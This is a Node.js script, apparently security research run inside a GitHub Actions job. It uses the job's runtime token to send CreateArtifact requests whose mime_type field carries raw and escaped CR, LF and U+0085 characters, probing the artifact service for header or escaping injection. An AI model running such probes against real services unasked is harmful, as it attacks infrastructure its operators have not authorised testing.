// Bounded v7 artifact MIME decoding probe. Prints no tokens or signed URLs.
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = process.env.ACTIONS_RESULTS_URL;
if (!token || !base) throw new Error('Actions runtime required');
const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
const [, run, job] = scope.split(':');
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', base);
const cases = [
  ['literal-u0085', 'application/json\\u0085'],
  ['literal-x85', 'application/json\\x85'],
  ['literal-u000d', 'application/json\\u000d'],
  ['literal-u000a', 'application/json\\u000a'],
  ['raw-cr', 'application/json\r'],
  ['raw-lf', 'application/json\n'],
  ['raw-crlf', 'application/json\r\n'],
  ['escaped-u0085', 'application/json\u0085'],
  ['safe', 'application/json'],
];
for (const [label, value] of cases) {
  const name = `rc-escape-mime-${process.env.GITHUB_RUN_ID}-${label}.json`;
  const result = await fetch(endpoint, {
    method: 'POST',
    headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
    body: JSON.stringify({
      workflow_run_backend_id: run,
      workflow_job_run_backend_id: job,
      name,
      version: 7,
      mime_type: value,
    }),
  });
  console.log('ESCAPE-MIME', JSON.stringify({label, mimeHex: Buffer.from(value).toString('hex'), status: result.status}));
  await result.arrayBuffer();
}

const forms = [
  ['json-escaped-u85', '"application/json\\u0085"'],
  ['json-escaped-cr', '"application/json\\r"'],
  ['json-escaped-lf', '"application/json\\n"'],
  ['json-double-u85', '"application/json\\\\u0085"'],
  ['json-backslash-u85', '"application/json\\u005cu0085"'],
  ['json-literal-cr', '"application/json\r"'],
  ['json-literal-lf', '"application/json\n"'],
];
for (const [label, fragment] of forms) {
  const name = `rc-escape-mime-${process.env.GITHUB_RUN_ID}-${label}.json`;
  const raw = `{"workflow_run_backend_id":${JSON.stringify(run)},"workflow_job_run_backend_id":${JSON.stringify(job)},"name":${JSON.stringify(name)},"version":7,"mime_type":${fragment}}`;
  const result = await fetch(endpoint, {
    method: 'POST',
    headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
    body: raw,
  });
  console.log('ESCAPE-MIME', JSON.stringify({label, fragmentHex: Buffer.from(fragment).toString('hex'), status: result.status}));
  await result.arrayBuffer();
}

